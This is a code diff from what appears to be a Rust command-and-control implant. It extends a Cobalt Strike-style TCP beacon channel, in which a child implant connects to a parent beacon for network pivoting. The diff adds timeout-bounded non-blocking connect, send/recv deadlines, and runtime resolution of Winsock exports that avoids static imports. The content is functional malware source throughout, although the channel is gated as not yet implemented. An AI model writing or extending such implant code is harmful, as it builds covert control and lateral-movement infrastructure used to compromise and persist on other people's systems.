@@ -2,8 +2,16 @@
 //!
 //! Cobalt Strike-style TCP Beacon: a child implant opens a TCP connection to a
 //! parent beacon (reverse_tcp). Traffic flows child → TCP → parent → HTTPS →
-//! server. This module implements the child (connecting) side only; the parent
-//! side is the team server / another implant's bind listener.
+//! server. This module implements the child (connecting) side only.
+//!
+//! ## NotImplemented status (implant-channels-2/3)
+//! The parent side (team-server listener / parent-implant bind socket) does
+//! NOT exist in this repo yet, so a beacon selected onto
+//! [`super::Channel::Tcp`] can never transact end-to-end. The dispatcher and `SetChannel` therefore gate
+//! this channel as not implemented (`Response::Err` on select, `None` +
+//! `ERR_CH_NOT_IMPL` on dispatch). The child-side code below stays live and
+//! timeout-bounded so the channel is ready to flip on when the pivot side
+//! lands.
 //!
 //! Framing: 4-byte little-endian length prefix followed by the frame body, in
 //! both directions. This mirrors CS's `tcp_frame_header` malleable option with a
@@ -46,6 +54,29 @@ const WSA_SUCCESS: i32 = 0;
 /// exhaust the bump allocator. Matches `transport::MAX_RESPONSE_BYTES`.
 const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;
 
+/// FIONBIO — `ioctlsocket` command toggling non-blocking mode (`u_long` argp:
+/// nonzero = non-blocking). Mirrors `pivot.rs`.
+const FIONBIO: i32 = 0x8004_667Eu32 as i32;
+/// SOL_SOCKET — socket-level option layer (`getsockopt`/`setsockopt`).
+const SOL_SOCKET: i32 = 0xFFFF;
+/// SO_ERROR — retrieve + clear the pending socket error (connect verdict).
+const SO_ERROR: i32 = 0x1007;
+/// SO_RCVTIMEO — receive timeout, DWORD milliseconds (Windows semantics).
+const SO_RCVTIMEO: i32 = 0x1006;
+/// SO_SNDTIMEO — send timeout, DWORD milliseconds (Windows semantics).
+const SO_SNDTIMEO: i32 = 0x1005;
+/// WSAEWOULDBLOCK — returned by `WSAGetLastError` when a non-blocking op
+/// (here: `connect`) would block.
+const WSAEWOULDBLOCK: i32 = 10035;
+/// Connect deadline (ms). A blackholed / firewalled peer would otherwise hold
+/// the single beacon thread through the kernel's full SYN-retry window
+/// (implant-channels-3). 10s is generous for an internal P2P pivot.
+const CONNECT_TIMEOUT_MS: u32 = 10_000;
+/// Per-`send`/`recv` deadline (ms), applied via `SO_SNDTIMEO`/`SO_RCVTIMEO`.
+/// On expiry Winsock returns `SOCKET_ERROR` with `WSAETIMEDOUT`, which
+/// `send_all`/`recv_exact` already treat as failure → fail-fast.
+const IO_TIMEOUT_MS: u32 = 10_000;
+
 // ══════════════════════════════════════════════════════════════════════════════
 // Winsock FFI types
 // ══════════════════════════════════════════════════════════════════════════════
@@ -70,6 +101,36 @@ type FnSend = unsafe extern "system" fn(Socket, *const u8, i32, i32) -> i32;
 type FnRecv = unsafe extern "system" fn(Socket, *mut u8, i32, i32) -> i32;
 /// `int closesocket(SOCKET s)`.
 type FnClosesocket = unsafe extern "system" fn(Socket) -> i32;
+/// `int select(int nfds, fd_set*, fd_set*, fd_set*, const timeval*)`.
+/// `nfds` is ignored on Windows; an fd_set is FD_SETSIZE (64) sockets.
+type FnSelect =
+    unsafe extern "system" fn(i32, *const FdSet, *const FdSet, *const FdSet, *const TimeVal) -> i32;
+/// `int ioctlsocket(SOCKET s, long cmd, u_long *argp)`.
+type FnIoctlsocket = unsafe extern "system" fn(Socket, i32, *mut u32) -> i32;
+/// `int getsockopt(SOCKET, int level, int optname, char *optval, int *optlen)`.
+type FnGetsockopt = unsafe extern "system" fn(Socket, i32, i32, *mut u8, *mut i32) -> i32;
+/// `int setsockopt(SOCKET, int level, int optname, const char *optval, int optlen)`.
+type FnSetsockopt = unsafe extern "system" fn(Socket, i32, i32, *const u8, i32) -> i32;
+/// `int WSAGetLastError(void)`.
+type FnWsaGetLastError = unsafe extern "system" fn() -> i32;
+
+/// `fd_set` (winsock2.h, FD_SETSIZE = 64). `SOCKET` is `UINT_PTR` (= usize on
+/// x64); only `fd_count` of the array entries are valid. Mirrors `pivot.rs`.
+#[repr(C)]
+#[derive(Clone, Copy)]
+struct FdSet {
+    fd_count: u32,
+    fd_array: [usize; 64],
+}
+
+/// `struct timeval` as defined by winsock2.h — `LONG` fields, 32-bit even on
+/// x64. Mirrors `pivot.rs`.
+#[repr(C)]
+#[derive(Clone, Copy)]
+struct TimeVal {
+    tv_sec: i32,
+    tv_usec: i32,
+}
 
 /// Resolved Winsock function table (cached after first `ensure_ws2_32`).
 struct WsaFns {
@@ -80,6 +141,11 @@ struct WsaFns {
     send: FnSend,
     recv: FnRecv,
     closesocket: FnClosesocket,
+    select: FnSelect,
+    ioctlsocket: FnIoctlsocket,
+    getsockopt: FnGetsockopt,
+    setsockopt: FnSetsockopt,
+    wsa_get_last_error: FnWsaGetLastError,
 }
 
 /// Winsock function table, stored as a raw pointer. 0 = uninitialized,
@@ -128,6 +194,14 @@ pub unsafe fn ensure_ws2_32() {
     let send = export_addr(b"ws2_32.dll", b"send");
     let recv = export_addr(b"ws2_32.dll", b"recv");
     let closesocket = export_addr(b"ws2_32.dll", b"closesocket");
+    // I/O timeouts (implant-channels-3): select/ioctlsocket/getsockopt for the
+    // bounded non-blocking connect; setsockopt for SO_RCVTIMEO/SO_SNDTIMEO;
+    // WSAGetLastError to distinguish WSAEWOULDBLOCK from a real connect error.
+    let select = export_addr(b"ws2_32.dll", b"select");
+    let ioctlsocket = export_addr(b"ws2_32.dll", b"ioctlsocket");
+    let getsockopt = export_addr(b"ws2_32.dll", b"getsockopt");
+    let setsockopt = export_addr(b"ws2_32.dll", b"setsockopt");
+    let wsa_get_last_error = export_addr(b"ws2_32.dll", b"WSAGetLastError");
     if let (
         Some(wsa_startup),
         Some(wsa_cleanup),
@@ -136,8 +210,25 @@ pub unsafe fn ensure_ws2_32() {
         Some(send),
         Some(recv),
         Some(closesocket),
-    ) = (wsa_startup, wsa_cleanup, socket, connect, send, recv, closesocket)
-    {
+        Some(select),
+        Some(ioctlsocket),
+        Some(getsockopt),
+        Some(setsockopt),
+        Some(wsa_get_last_error),
+    ) = (
+        wsa_startup,
+        wsa_cleanup,
+        socket,
+        connect,
+        send,
+        recv,
+        closesocket,
+        select,
+        ioctlsocket,
+        getsockopt,
+        setsockopt,
+        wsa_get_last_error,
+    ) {
         let fns = alloc::boxed::Box::new(WsaFns {
             wsa_startup: core::mem::transmute(wsa_startup),
             wsa_cleanup: core::mem::transmute(wsa_cleanup),
@@ -146,6 +237,11 @@ pub unsafe fn ensure_ws2_32() {
             send: core::mem::transmute(send),
             recv: core::mem::transmute(recv),
             closesocket: core::mem::transmute(closesocket),
+            select: core::mem::transmute(select),
+            ioctlsocket: core::mem::transmute(ioctlsocket),
+            getsockopt: core::mem::transmute(getsockopt),
+            setsockopt: core::mem::transmute(setsockopt),
+            wsa_get_last_error: core::mem::transmute(wsa_get_last_error),
         });
         let ptr = alloc::boxed::Box::into_raw(fns) as usize;
         match WSA.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
@@ -335,6 +431,15 @@ unsafe fn tcp_round(
 
 /// connect → send → recv over an already-created socket. Returns None (with a
 /// diag mark) on any failure; the caller closes the socket.
+///
+/// ## Bounded I/O contract (implant-channels-3)
+/// The beacon is single-threaded, so every step here carries a deadline:
+/// - `connect` runs non-blocking (FIONBIO) and is resolved by `select` with a
+///   [`CONNECT_TIMEOUT_MS`] deadline — a blackholed or firewalled peer can no
+///   longer hold the beacon thread through the kernel's full SYN-retry window.
+/// - `send`/`recv` are bounded by [`SO_SNDTIMEO`]/[`SO_RCVTIMEO`] ([`IO_TIMEOUT_MS`]
+///   each); on expiry Winsock returns `SOCKET_ERROR` with `WSAETIMEDOUT`, which
+///   `send_all`/`recv_exact` already treat as failure → fail-fast.
 unsafe fn tcp_exchange(
     fns: &WsaFns,
     s: Socket,
@@ -342,17 +447,78 @@ unsafe fn tcp_exchange(
     sin_port: u16,
     frame: &[u8],
 ) -> Option<Vec<u8>> {
-    // ---- connect ----
+    // ---- connect with deadline ----
     let addr = SockaddrIn {
         sin_family: AF_INET as u16,
         sin_port,
         sin_addr,
         sin_zero: [0u8; 8],
     };
-    if (fns.connect)(s, &addr, core::mem::size_of::<SockaddrIn>() as i32) != 0 {
+
+    // Non-blocking connect + select-for-writability, then restore blocking
+    // mode for the (timeout-bounded) send/recv phase. Same shape as
+    // `pivot.rs`'s connect; the only difference is we always restore blocking
+    // mode because this socket is used synchronously below.
+    let mut nonblock: u32 = 1;
+    let _ = (fns.ioctlsocket)(s, FIONBIO, &mut nonblock);
+    let rc = (fns.connect)(s, &addr, core::mem::size_of::<SockaddrIn>() as i32);
+    let mut connected = rc == 0;
+    if !connected && (fns.wsa_get_last_error)() == WSAEWOULDBLOCK {
+        let mut wfds = FdSet {
+            fd_count: 1,
+            fd_array: [0usize; 64],
+        };
+        wfds.fd_array[0] = s;
+        let tv = TimeVal {
+            tv_sec: (CONNECT_TIMEOUT_MS / 1000) as i32,
+            tv_usec: ((CONNECT_TIMEOUT_MS % 1000) * 1000) as i32,
+        };
+        let n = (fns.select)(0, core::ptr::null(), &wfds, core::ptr::null(), &tv);
+        if n > 0 {
+            // select said writable — confirm the connect actually succeeded
+            // (the pending error, if any, lands in SO_ERROR).
+            let mut err: i32 = 0;
+            let mut errlen: i32 = core::mem::size_of::<i32>() as i32;
+            if (fns.getsockopt)(
+                s,
+                SOL_SOCKET,
+                SO_ERROR,
+                &mut err as *mut i32 as *mut u8,
+                &mut errlen,
+            ) == 0
+                && err == 0
+            {
+                connected = true;
+            }
+        }
+    }
+    // Back to blocking mode; SO_*TIMEO bounds the blocking ops below.
+    let mut blocking: u32 = 0;
+    let _ = (fns.ioctlsocket)(s, FIONBIO, &mut blocking);
+    if !connected {
         crate::entry::diag_mark(b"ERR_CH_TCP_CONNECT");
         return None;
     }
+
+    // ---- Bound send/recv with SO_SNDTIMEO / SO_RCVTIMEO ----
+    // Winsock takes the DWORD millisecond value; on the LE x64 target copying
+    // the u32 (via its bytes) is correct.
+    let sndto: u32 = IO_TIMEOUT_MS;
+    let _ = (fns.setsockopt)(
+        s,
+        SOL_SOCKET,
+        SO_SNDTIMEO,
+        &sndto as *const u32 as *const u8,
+        core::mem::size_of::<u32>() as i32,
+    );
+    let rcvto: u32 = IO_TIMEOUT_MS;
+    let _ = (fns.setsockopt)(
+        s,
+        SOL_SOCKET,
+        SO_RCVTIMEO,
+        &rcvto as *const u32 as *const u8,
+        core::mem::size_of::<u32>() as i32,
+    );
 
     // ---- Send length prefix (LE) + frame body ----
     let len_be: [u8; 4] = (frame.len() as u32).to_le_bytes();
